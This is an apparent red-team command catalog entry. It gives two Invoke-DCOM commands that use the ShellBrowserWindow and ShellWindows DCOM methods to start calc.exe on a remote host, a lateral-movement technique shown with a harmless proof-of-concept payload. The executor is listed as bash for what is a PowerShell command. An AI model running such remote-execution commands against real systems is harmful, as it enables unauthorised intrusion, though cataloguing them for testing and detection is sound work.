---
id: 6a31e5ba-5a22-4484-a845-fb6a18cb821c
name: Invoke DCOM to Start Calc.exe using ShellBrowserWindow and ShellWindows Methods
type: command
executor: bash
data: 'Invoke-DCOM -ComputerName ''10.10.10.10'' -Method ShellBrowserWindow -Command
  "calc.exe"

  Invoke-DCOM -ComputerName ''10.10.10.10'' -Method ShellWindows -Command "calc.exe"'
output: null
created_at: '2023-04-06T03:56:07.043566+00:00'
updated_at: '2023-04-10T20:26:18.160002+00:00'
---

# Invoke DCOM to Start Calc.exe using ShellBrowserWindow and ShellWindows Methods

```bash
Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellBrowserWindow -Command "calc.exe"
Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellWindows -Command "calc.exe"
```


